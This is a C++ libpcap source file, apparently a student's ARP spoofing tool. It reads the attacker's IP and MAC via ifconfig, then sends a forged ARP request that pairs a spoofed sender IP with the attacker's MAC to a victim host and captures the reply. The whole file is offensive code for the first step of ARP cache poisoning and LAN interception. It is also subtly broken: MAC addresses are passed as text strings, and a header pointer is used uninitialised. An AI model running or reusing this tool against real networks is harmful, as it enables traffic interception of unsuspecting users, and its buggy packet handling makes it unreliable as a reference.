#include <QCoreApplication>
#include <iostream>
#include <fstream>
#include <stdio.h>

// Add class made by bearics
#include "arppacket.h"

using namespace std;

void getAttackerInfo(u_char* ip, u_char* mac);
void sendPkt(pcap_t *handle, u_char* send_pkt, int size);
void receivePkt(pcap_t *handle, struct pcap_pkthdr *header, ArpPacket &arpPkt);

int main(int argc, char *argv[])
{
    pcap_t *handle;			/* Session handle */
    char *dev;			/* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
    //struct bpf_program fp;		/* The compiled filter */
    //char filter_exp[] = "port ";	/* The filter expression */
    bpf_u_int32 mask;		/* Our netmask */
    bpf_u_int32 net;		/* Our IP */
    struct pcap_pkthdr *header;	/* The header that pcap gives us */

    // attacker's information
    u_char attackerIP[16];     // 255.255.255.255 = 15+1
    u_char attackerMAC[18];    // FF:FF:FF:FF:FF:FF = 17+1

    getAttackerInfo(attackerIP, attackerMAC);

    cout << "Attacker's IP : " << attackerIP <<endl;
    cout << "Attacker's MAC : " << attackerMAC<<endl;

    /* Define the device */
    dev = pcap_lookupdev(errbuf);;
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    }
    /* Find the properties for the device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }
    printf("Device is %s\n", argv[1]);
    /* Open the session in promiscuous mode */
    handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
        return(2);
    }
    // packet is attacker send to sender(victim)
    ArpPacket a2s;
    a2s.setEtherDestMac((u_char*)"FF:FF:FF:FF:FF:FF");
    a2s.setEtherSourceMac(attackerMAC);
    a2s.setArpOpcode(ARPOP_REQUEST);
    a2s.setArpSenderIP((u_char*)argv[3]);
    a2s.setArpSenderMac(attackerMAC);
    a2s.setArpTargetIP((u_char*)argv[2]);
    a2s.setArpTargetMac((u_char*)"00:00:00:00:00:00");

    sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
    receivePkt(handle, header, a2s);
}

void getAttackerInfo(u_char* attackerIP, u_char* attackerMAC)
{
    FILE *fp;

    fp = popen( "ifconfig | grep -A3 \"inet\" | sed -n 1p | awk '{print $2}'", "r");
    fscanf(fp, "%s", attackerIP);
    pclose(fp);

    fp = popen( "ifconfig | grep -A3 \"inet\" | sed -n 3p | awk '{print $2}'", "r");
    fscanf(fp, "%s", attackerMAC);
    pclose(fp);

}

void sendPkt(pcap_t *handle, u_char* send_pkt, int size)
{
    if(pcap_sendpacket(handle, send_pkt, size) == -1)
        cout << "Sending ERROR!" << endl;
    else
        cout << "Sending SUCCESS!" << endl;
}

void receivePkt(pcap_t *handle, struct pcap_pkthdr *header, ArpPacket &arpPkt)
{
    int res=0;
    const u_char *pkt;
    struct ether_header *eth;
    struct ether_arp *arp;
    while((res = pcap_next_ex( handle, &header, &pkt)) >= 0){
        eth=(struct ether_header *)pkt;
        arp=(struct ether_arp *)(pkt+ETH_HLEN);
        /* Check ARP */
        if(ntohs(eth->ether_type) == ETHERTYPE_ARP ){
            // compare sender ip
            for(int i=0;i<4;i++) printf(" %2x", arpPkt.arp->arp_tpa[i]);
            printf("\n");
            for(int i=0;i<4;i++) printf(" %2x", arp->arp_spa[i]);
            printf("\n");
            printf("%d\n",sizeof(struct in_addr));
            if(memcmp(arpPkt.arp->arp_tpa, arp->arp_spa, sizeof(struct in_addr))==0)
            {
                if(memcmp(arpPkt.eth->ether_dhost, (u_char*)"\xFF\xFF\xFF\xFF\xFF\xFF", ETHER_ADDR_LEN) == 0)
                {
                    memcpy(arpPkt.eth->ether_dhost, eth->ether_shost, ETHER_ADDR_LEN);
                    memcpy(arpPkt.arp->arp_tha, eth->ether_shost, ETHER_ADDR_LEN);
                    for(int i=0;i<4;i++) printf(" %02x", arpPkt.eth->ether_dhost[i]);
                    printf("\n");
                    for(int i=0;i<4;i++) printf(" %02x", arpPkt.arp->arp_tha[i]);
                    printf("\n");

                    cout << "changed";
                }

            }

            for(int i=0;i<42;i++) printf(" %2x", pkt[i]);
            break;
        }

    }
}
